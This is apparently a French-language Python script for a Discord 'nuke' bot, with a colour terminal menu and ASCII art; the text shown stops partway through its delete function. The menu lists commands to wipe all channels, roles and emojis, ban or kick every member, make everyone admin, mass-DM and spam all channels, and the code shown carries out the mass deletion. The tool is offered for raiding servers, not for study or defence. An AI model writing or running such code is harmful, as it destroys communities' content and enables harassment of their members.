import discord
import asyncio
import os
from colorama import init, Fore, Style
import getpass
import subprocess
import sys

init(autoreset=True)


ASCII_ART_3 = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣤⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠐⡈⠐⠠⢁⠂⠐⢀⣾⣿⡿⠿⠿⠿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠿⣷⡄⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠐⠠⢁⠂⠄⠀⣛⠀⡟⢁⣠⣄⠀⠀⠀⠙⢻⡟⠉⠀⠀⢀⣴⣦⣬⠃⣬⣅⠀⢂⠐⡀⢂⠐⠠⠀⠄⠠⠀⠄⠠⢀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡁⢂⠈⠀⠾⡛⢱⡿⢿⣿⣿⣿⣦⣄⣠⣼⣷⣤⣤⣶⠿⠿⢿⣟⠆⢉⡛⠆⠀⢂⠐⠠⠈⠄⠡⠈⠄⠡⢈⠐⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡐⢀⠂⢠⣾⡟⣸⣰⡿⠁⠀⠀⠙⣿⡇⣿⣿⠸⣿⠁⢀⣀⣀⣙⡸⠎⢿⡆⠀⠂⠌⠠⠁⠌⠠⠁⠌⡐⢀⠂⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠠⠀⠄⠀⠟⡸⢛⣤⣼⣿⣿⣿⣤⣼⠇⣿⣿⠀⢧⣿⣿⣿⣿⣿⣿⣧⣄⠃⠀⢃⠘⡀⢃⠘⡀⠃⠄⠠⢀⠘⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢂⠡⠈⠄⢈⡾⠋⢹⣿⣿⣿⣿⡟⢡⣴⣿⣿⣷⣦⡙⢿⣿⣿⣿⣿⠀⠙⠀⠈⡀⢂⠐⡀⠂⠄⠡⢈⠐⡀⠂⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠄⢂⠡⠀⢸⠀⠀⢸⣿⣿⣿⣿⡀⣿⣿⣿⣿⣿⣿⡇⠸⢿⣿⣿⡟⠀⠀⠀⠀⡐⢀⠂⠄⠡⢈⠐⡀⢂⠐⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠄⡐⠠⠀⠀⠀⠀⠙⠋⠉⠀⠀⠉⠉⠙⠛⠋⠉⠀⠀⠀⠀⠁⠀⠀⠀⠀⢀⠐⠠⠈⠄⡁⢂⠐⡀⠂⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢈⠐⠠⠁⠄⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⢀⣀⠀⠀⢀⠂⠌⠠⢁⠂⡐⢀⠂⠄⠡⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠠⠈⠄⠡⢈⠐⡀⠸⣿⣦⡀⠀⠀⠛⠒⠚⠛⠛⠛⠛⠀⢀⣴⣿⠃⠀⠌⡀⠂⠌⡐⢀⠂⡐⠠⠈⠄⡁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠡⢈⠐⡀⠂⠄⠀⢻⣿⣿⣷⣶⣦⣤⣤⣤⣤⣤⣶⣾⣿⣿⡿⠀⠐⠠⢀⠁⢂⠐⡀⠂⠄⠡⢈⠐⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⡐⢀⠂⠄⠡⠈⠄⠘⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⡿⠃⠀⠌⡐⠠⠈⠄⠂⠄⠡⢈⠐⠠⠈⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡐⠠⠈⠄⠡⢈⠐⠀⠀⠙⠃⣿⣿⣿⣿⣿⣿⣿⣿⡗⠋⠀⣤⠀⠀⠀⠡⠈⠄⠡⢈⠐⠠⠈⠄⡁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠄⠡⠈⠄⡁⠂⠀⠀⣤⡀⠀⢻⣿⣿⣿⣿⣿⣿⣿⠇⣠⣾⣿⠀⣰⠀⠀⠀⣈⡀⠀⠈⠀⠁⠂⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡈⠄⠁⠂⠀⠀⠀⠀⢻⣿⣷⠬⠉⠉⠉⠉⠉⠉⠀⠚⢿⣿⣿⢀⣿⡀⠀⠀⢹⣿⣿⣿⣿⣶⡶⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⢸⣧⠘⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⣾⣿⡇⠀⠁⠀⢻⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢸⣟⡿⠀⠀⠀⠀⣿⣿⣦⠘⣿⣶⠖⣠⠆⠀⠀⢳⣤⡙⢿⣟⣼⣿⣿⡇⠀⠐⡀⠈⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⣿⠃⠀⠀⠀⠀⢿⣿⣿⣷⣌⣿⣾⠏⠀⡀⠀⠸⡿⠿⠾⠿⠿⠿⠿⠷⠀⠀⠄⠀⠸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⢠⠀⠀⠈⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⢠⠀⡄⣴⠀⠀⡄⠐⠀⠀⢻⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠠⠀⠀⠀⠀⢀⠀⠠⠀⠄⢂⠐⠠⢈⠐⡈⠐⡀⢂⠐⠘⢷⡭⠂⠄⡁⢂⠀⠈⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠡⠐⠠⠈⡐⠠⠈⠄⠡⠈⠄⡈⠐⡀⠂⠄⠡⠐⠠⠨⠄⠆⠠⠌⠠⠐⠠⢀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⡿⠿⠿⠀⣼⡿⠿⣿⡆⢠⣿⠿⢿⣷⠀⣼⡿⠿⣿⡆⢸⣿⠀⣿⡿⠿⠿⠀⠾⢿⣿⠿⠇⠘⣿⡄⣰⡿⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣧⣤⡄⠀⢿⣧⣤⣤⡁⢨⣿⠀⢀⣿⠀⣿⡇⠀⠀⠁⢸⣿⠀⣿⣧⣤⡄⠀⠀⢸⣿⠀⠀⠀⠘⢿⣿⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⡏⠁⠁⠀⣤⣍⣈⣿⡇⢸⣿⣀⣀⣿⠀⣿⣇⣀⣤⡄⢸⣿⠀⣿⣇⣉⣀⠀⠀⢸⣿⠀⠀⠀⠀⢸⣯⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠛⠃⠀⠀⠀⠙⠛⠛⠛⠁⠀⠛⠛⠛⠋⠀⠘⠛⠛⠛⠁⠘⠛⠀⠛⠛⠛⠛⠀⠀⠘⠛⠀⠀⠀⠀⠘⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""

ASCII_ART_4 = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣴⡾⠟⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠷⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⡾⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡾⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣰⣿⠋⠀⠀⠀⠀⢀⣠⣴⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠴⣒⡽⠟⣩⠏⢩⠉⢏⠙⠯⣑⠲⠦⣄⡀⠀⠀⠀⠀⠀⠀⠙⢶⣤⡀⠀⠀⠀⠀⠈⢿⣦⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⡟⠁⠀⠀⣠⢄⣶⣿⠟⠁⠀⠀⠀⠀⢀⣴⠞⠋⠀⣠⠞⠁⠀⣰⠋⠀⣼⠀⠀⢧⡀⠈⠙⢦⡀⠉⠓⠦⣀⡀⠀⠀⠀⠀⠹⣿⣷⣤⢤⡀⠀⠀⠹⣷⡀⠀⠀⠀⠀
⠀⠀⠀⢀⣾⠟⠀⠀⣴⡟⢠⣿⡿⢋⡄⠀⠀⠀⣠⠞⠃⠤⢄⣀⠞⠁⠀⠀⢰⡏⠀⠀⠿⠀⠀⠘⣧⠀⠀⠀⠙⣆⣀⠤⠄⠛⢦⡀⠀⠀⠐⡜⢿⣿⣆⢻⣦⡀⠀⠘⣿⡄⠀⠀⠀
⠀⠀⢀⣾⠏⠀⡠⣸⣿⠇⡾⢋⣴⡟⠀⠀⢠⠞⠃⠀⠀⠀⢠⠟⠙⠒⠒⠤⡞⠀⣤⣤⠶⣤⣤⡀⠘⠀⠐⠒⠊⠙⣧⠀⠀⠀⠀⠙⣄⠀⠀⠹⣶⣝⠻⡄⣿⣷⢠⡀⠘⣿⡄⠀⠀
⠀⠀⣼⠟⠀⣼⠁⣿⡟⣠⣾⣿⠟⠁⠀⡴⠋⠀⠀⠀⠀⢠⠏⠀⠀⠀⠀⠀⡇⠀⢻⣿⢶⢸⣿⡇⠀⠀⠀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠈⢳⡀⠀⠙⢿⣷⣄⢸⣿⡇⣷⡀⠘⣿⡄⠀
⠀⣸⡿⠀⢸⣿⠀⣿⣽⡿⢋⡵⠀⢀⡾⠁⠀⠀⠀⠀⠀⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡾⠛⠁⠀⠀⠀⠀⠀⠀⠀⠸⡆⠀⠀⠀⠀⠀⠹⡄⠀⠸⣏⠿⣷⣿⠃⣿⣷⠀⢹⣧⠀
⠀⣿⠇⠀⣼⣿⡇⣼⢋⣴⡿⠁⠀⡼⠀⠉⠒⠶⠦⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡀⠤⠴⠂⠈⠀⢹⡀⠀⢹⣷⣌⢻⡄⣿⣿⠀⠀⢿⡄
⢸⡟⠀⣴⢹⣿⡇⣱⣿⡿⠁⠀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⢴⣿⡷⠤⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⠀⠀⣻⣿⣷⡀⣿⣿⠀⠀⢸⡇
⢸⡇⠀⣿⠘⣿⣿⣿⠏⣰⠀⠀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡆⠀⢻⠙⢿⣧⣿⡇⢠⡇⠀⣿
⣾⠁⠸⣿⡄⠹⡿⠃⣴⡟⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⣯⣿⣭⣥⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⢸⣧⠈⢻⡿⠀⣾⡇⠀⣿
⣿⠀⠀⣿⣷⡀⠇⣼⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⡇⠀⢨⣿⣇⠀⠀⣿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡁⠀⠸⣿⣷⡈⠇⣼⣿⠇⠀⣿
⢿⡄⢀⢻⣿⣷⢸⣿⡟⢀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⢠⣶⣶⣾⣿⣿⣿⣿⡿⠀⠀⠉⣿⡈⠀⠀⢹⣿⣿⣿⣿⣿⣶⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⢠⠸⣿⡇⣰⣿⡿⠀⠀⣿
⢸⡇⢸⡄⠻⣿⣼⣿⠁⣸⠀⠀⣷⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⢰⣿⡇⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⢸⠇⠀⣼⡀⢿⡇⣿⡟⢁⡇⠀⣿
⢸⣧⠀⣿⣄⠘⢿⡟⢠⣿⡇⠀⠹⡆⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⢸⣿⡇⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⢀⡿⠀⢀⣿⡇⢸⣿⠟⢠⣾⠇⢸⡇
⠀⣿⡄⠙⣿⣷⣌⠓⢸⣿⡗⢄⠀⢱⡀⣀⣤⠴⠖⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⢸⣿⡇⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠓⠶⢤⣄⣀⣼⠁⢠⣾⣿⣧⠸⢁⣶⣿⠟⠀⣾⠃
⠀⢹⣷⠀⠈⢿⣿⣷⡸⣿⡇⠘⣦⡀⢣⡀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⣸⠃⣰⡏⢸⣿⡏⣴⣿⣿⠋⠀⣸⡿⠀
⠀⠀⢻⣦⠘⣦⠙⠿⣷⣿⣿⠀⣿⣧⠀⠳⡄⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⢀⡼⠁⣰⣿⠁⢸⣟⣼⡿⠛⣁⠇⢠⣿⠃⠀
⠀⠀⠈⢿⣆⠘⢿⣦⣈⠙⠿⣇⢸⣿⣧⢀⠈⠂⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠠⠋⢀⣠⣿⡿⢠⠿⠛⢁⣠⣶⠏⢠⣿⠃⠀⠀
⠀⠀⠀⠈⢿⣆⠈⠻⣿⣷⣶⣬⡀⢻⣿⡎⢳⣄⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣠⡶⢋⣿⣿⢁⣡⣴⣶⣿⠿⠃⢠⣾⠋⠀⠀⠀
⠀⠀⠀⠀⠈⢻⣧⡀⠈⢙⠿⣿⣿⣷⣿⣷⡄⢿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢁⣼⣿⣵⣿⣿⠿⢟⠁⠀⣰⣿⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠹⣷⣄⠈⢳⣤⣈⣉⠉⠙⠛⠆⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠱⠞⠛⠉⣉⣁⣠⡴⠃⢀⣴⡟⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⡀⠈⠛⠿⣿⣿⣿⣿⣿⣿⣶⡿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⢿⣷⣾⣿⣿⣿⣿⣿⠿⠟⠋⢀⣴⡿⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠻⣦⣄⠀⠰⣬⣉⣉⣉⣉⣀⣤⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣤⣀⣉⣉⣉⣉⣩⠴⠀⢀⣴⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣤⡈⠙⠛⠿⠿⢿⠿⠿⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠻⠿⠿⠿⠿⠟⠛⠁⣠⣶⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣷⣦⣀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⢀⣠⣶⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⢶⣤⣄⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣀⣤⣴⠾⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠟⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""

ascii_counter = 0

def clear_screen():
    """Efface l'ecran du terminal"""
    if os.name == 'nt': 
        os.system('cls')
    else:  
        os.system('clear')

def show_ascii():
    """Affiche l'ASCII art en rouge - alterne entre les 2 ASCII arts disponibles"""
    global ascii_counter
    ascii_counter += 1

    if ascii_counter % 2 == 1:
        print(Fore.RED + ASCII_ART_3)
    else:
        print(Fore.RED + ASCII_ART_4)

    print(Fore.RED + '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

class DiscordBot(discord.Client):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.selected_guild = None

    async def on_ready(self):
        clear_screen()
        print(Fore.RED + f'Bot connecte en tant que {self.user}!')
        if self.user:
            print(Fore.RED + f'ID: {self.user.id}')

        show_ascii()
        print(Fore.RED + 'Le bot est maintenant en ligne!')

        await self.select_server()

        await self.command_menu()

    def show_servers(self):
        """Affiche la liste des serveurs disponibles"""
        guilds = list(self.guilds)

        if not guilds:
            clear_screen()
            show_ascii()
            print(Fore.RED + "mon reuf t sur aucun serveur")
            return None

        clear_screen()
        show_ascii()
        print(Fore.RED + f"Serveurs disponibles ({len(guilds)}):")

        for i, guild in enumerate(guilds, 1):
            member_count = guild.member_count or "?"
            print(Fore.RED + f"{i}. {guild.name} ({member_count} membres)")

        return guilds

    async def select_server(self):
        """Permet de sélectionner un serveur"""
        guilds = self.show_servers()

        if not guilds:
            return

        print(Fore.RED + "\nChoisissez un serveur:")

        while True:
            try:
                choice = input(Fore.RED + "Numero du serveur ('q' pour quitter, 'b' pour retourner): ").strip()

                if choice.lower() == 'q':
                    clear_screen()
                    show_ascii()
                    print(Fore.RED + "Arret du bot...")
                    await self.close()
                    return
                elif choice.lower() == 'b':
                    return

                server_num = int(choice)
                if 1 <= server_num <= len(guilds):
                    self.selected_guild = guilds[server_num - 1]
                    clear_screen()
                    show_ascii()
                    print(Fore.RED + f"Serveur selectionne: {self.selected_guild.name}")
                    break
                else:
                    clear_screen()
                    show_ascii()
                    print(Fore.RED + f"Choisissez un numero entre 1 et {len(guilds)}")

            except ValueError:
                clear_screen()
                show_ascii()
                print(Fore.RED + "Entrez un numero valide ou 'q' pour quitter")
            except Exception as e:
                clear_screen()
                show_ascii()
                print(Fore.RED + f"Erreur: {e}")

    async def command_menu(self):
        """Menu interactif des commandes dans le terminal"""
        while True:
            clear_screen()
            show_ascii()
            print(Fore.RED + "COMMANDES ORGANISEES PAR CATEGORIE")
            print(Fore.RED + "")
            
            print(Fore.RED + "┌─────── COLONNE 1 ─────┬─────── COLONNE 2 ─────┬─────── COLONNE 3 ─────┐")
            print(Fore.RED + "│ 1. nuke - Destruction │ 7. delemojis - Sup    │ 13. leave - Faire     │")
            print(Fore.RED + "│    totale du serveur  │    tous les emojis    │     quitter le bot    │")
            print(Fore.RED + "│                       │                       │                       │")
            print(Fore.RED + "│ 2. alladmin - Donner  │ 8. dm - Message prive │ 14. rename - Renommer │")
            print(Fore.RED + "│    admin a tous       │    a une personne     │     le serveur        │")
            print(Fore.RED + "│                       │                       │                       │")
            print(Fore.RED + "│ 3. banall - Bannir    │ 9. dmall - Message    │ 15. randomban - Ban   │")
            print(Fore.RED + "│    tous les membres   │    prive a tous       │     membre aleatoire  │")
            print(Fore.RED + "│                       │                       │                       │")
            print(Fore.RED + "│ 4. kickall - Kicker   │ 10. spam - Spammer   │ 16. randomkick - Kick │")
            print(Fore.RED + "│    tous les membres   │     dans tous salons  │     membre aleatoire  │")
            print(Fore.RED + "│                       │                       │                       │")
            print(Fore.RED + "│ 5. delchans - Sup     │ 11. create - Creer    │ 17. pub - pub tout le │")
            print(Fore.RED + "│    tous les salons    │     salons ou roles   │     serveur tkt pas   │")
            print(Fore.RED + "│                       │                       │     c cool            │")
            print(Fore.RED + "│ 6. delroles - Sup     │ 12. kickbots - Kicker │                       │")
            print(Fore.RED + "│    tous les roles     │     tous les bots     │                       │")
            print(Fore.RED + "└───────────────────────┴───────────────────────┴───────────────────────┘")
            print(Fore.RED + "")
            print(Fore.RED + "Touches: b = Retour | q = Quitter")

            try:
                choice = input(Fore.RED + "Choisissez une commande (1-17, b ou q): ").strip().lower()

                if choice == 'q':
                    clear_screen()
                    show_ascii()
                    print(Fore.RED + "Arret du bot...")
                    await self.close()
                    return
                elif choice == 'b':
                    await self.select_server()
                    if not self.selected_guild:
                        return
                elif choice == '1' or choice == 'nuke':
                    clear_screen()
                    show_ascii()
                    print(Fore.RED + "debut du nuke ...")
                    await self.delete_all_channels()
                    print(Fore.RED + "Nuke termine!")
                    input(Fore.RED + "Appuyez sur Entree pour continuer...")
                elif choice == '2' or choice == 'alladmin':
                    clear_screen()
                    show_ascii()
                    print(Fore.RED + "alladmin en cours ...")
                    await self.make_everyone_admin()
                    print(Fore.RED + "Tout le monde est maintenant admin!")
                    input(Fore.RED + "Appuyez sur Entree pour continuer...")
                elif choice == '3' or choice == 'banall':
                    clear_screen()
                    show_ascii()
                    print(Fore.RED + "banall en cours ...")
                    await self.ban_everyone()
                    print(Fore.RED + "Tous les membres ont ete bannis!")
                    input(Fore.RED + "Appuyez sur Entree pour continuer...")
                elif choice == '4' or choice == 'kickall':
                    clear_screen()
                    show_ascii()
                    print(Fore.RED + "kickall en cours ...")
                    await self.kick_everyone()
                    print(Fore.RED + "Tous les membres ont ete kickes!")
                    input(Fore.RED + "Appuyez sur Entree pour continuer...")
                elif choice == '5' or choice == 'delchans':
                    clear_screen()
                    show_ascii()
                    print(Fore.RED + "Suppression de tous les salons en cours...")
                    await self.delete_channels_only()
                    print(Fore.RED + "Tous les salons ont ete supprimes!")
                    input(Fore.RED + "Appuyez sur Entree pour continuer...")
                elif choice == '6' or choice == 'delroles':
                    clear_screen()
                    show_ascii()
                    print(Fore.RED + "Suppression de tous les roles en cours...")
                    await self.delete_roles_only()
                    print(Fore.RED + "Tous les roles ont ete supprimes!")
                    input(Fore.RED + "Appuyez sur Entree pour continuer...")
                elif choice == '7' or choice == 'delemojis':
                    clear_screen()
                    show_ascii()
                    print(Fore.RED + "Suppression de tous les emojis en cours...")
                    await self.delete_emojis_only()
                    print(Fore.RED + "Tous les emojis ont ete supprimes!")
                    input(Fore.RED + "Appuyez sur Entree pour continuer...")
                elif choice == '8' or choice == 'dm':
                    await self.send_dm()
                elif choice == '9' or choice == 'dmall':
                    await self.send_dm_all()
                elif choice == '10' or choice == 'spam':
                    await self.spam_all_channels()
                elif choice == '11' or choice == 'create':
                    await self.create_channels()
                elif choice == '12' or choice == 'kickbots':
                    clear_screen()
                    show_ascii()
                    print(Fore.RED + "Kick de tous les bots en cours...")
                    await self.kick_all_bots()
                    print(Fore.RED + "Tous les bots ont ete kickes!")
                    input(Fore.RED + "Appuyez sur Entree pour continuer...")
                elif choice == '13' or choice == 'leave':
                    clear_screen()
                    show_ascii()
                    await self.leave_server()
                elif choice == '14' or choice == 'rename':
                    await self.rename_server()
                elif choice == '15' or choice == 'randomban':
                    await self.random_ban()
                elif choice == '16' or choice == 'randomkick':
                    await self.random_kick()
                elif choice == '17' or choice == 'pub':
                    await self.pub_tiktok()
                else:
                    clear_screen()
                    show_ascii()
                    print(Fore.RED + "Choix invalide. Tapez 1-17, b ou q")
                    input(Fore.RED + "Appuyez sur Entree pour continuer...")

            except Exception as e:
                clear_screen()
                show_ascii()
                print(Fore.RED + f"Erreur: {e}")
                input(Fore.RED + "Appuyez sur Entree pour continuer...")

    async def on_disconnect(self):
        clear_screen()
        show_ascii()
        print(Fore.RED + 'Bot deconnecte!')

    async def close(self):
        """Ferme proprement la connexion"""
        try:
            await super().close()
        except Exception:
            pass

    async def on_connect(self):
        print(Fore.RED + 'Connexion a Discord etablie...')


    async def delete_all_channels(self):
        """Supprime TOUT du serveur sélectionné et crée un salon final"""
        if not self.selected_guild:
            return

        channels = list(self.selected_guild.channels)
        for channel in channels:
            try:
                await channel.delete()
            except:
                continue

        roles = [role for role in self.selected_guild.roles if role.name != "@everyone"]
        for role in roles:
            try:
                await role.delete()
            except:
                continue

        emojis = list(self.selected_guild.emojis)
        for emoji in emojis:
            try:
                await emoji.delete()
            except:
                continue

        stickers = list(self.selected_guild.stickers)
        for sticker in stickers:
            try:
                await sticker.delete()
